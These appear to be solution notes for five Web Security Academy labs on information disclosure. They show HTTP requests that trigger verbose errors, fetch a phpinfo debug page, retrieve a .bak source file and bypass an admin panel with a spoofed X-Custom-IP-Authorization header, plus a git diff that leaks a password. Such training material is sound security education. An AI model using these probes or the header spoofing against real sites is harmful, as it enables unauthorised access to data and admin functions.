### Lab: Information disclosure in error messages
This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.
```
GET /product?productId=a HTTP/2
Host: 0a93000f049ecb138157da4b00d30036.web-security-academy.net
Cookie: session=wFkBlBbCgSVEufN2CWY8gKTgvemmTDez
```
### Lab: Information disclosure on debug page

This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable. 
```
GET /cgi-bin/phpinfo.php HTTP/2
Host: 0a6d00bc04021c1b83be949100cc00d1.web-security-academy.net
Cookie: session=Rf8Bv18V4BHhpfpJxmD3p3yAQCn1ZoRn
```
### Lab: Source code disclosure via backup files

This lab leaks its source code via backup files in a hidden directory. To solve the lab, identify and submit the database password, which is hard-coded in the leaked source code. 
```
GET /backup/ProductTemplate.java.bak HTTP/2
Host: 0ae60063030efa108211f2e200ef00db.web-security-academy.net
Cookie: session=Xb4yrszrGGTqYSiEPYBrEmCiQF68QgQi
```
### Lab: Authentication bypass via information disclosure

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
```
GET /admin HTTP/2
Host: 0aa9008f03f064948136090e00cf0056.web-security-academy.net
Cookie: session=OE8AI1Kcm7m2qxqNgqqxwhoiibRj0v81
X-Custom-IP-Authorization: 127.0.0.1
```
### Lab: Information disclosure in version control history

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos. 

```
commit ec03f931c6ef362896960e6249adf51c79c7ae34 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 267011c..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=3xi2xozqjsqixrgflbnf
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```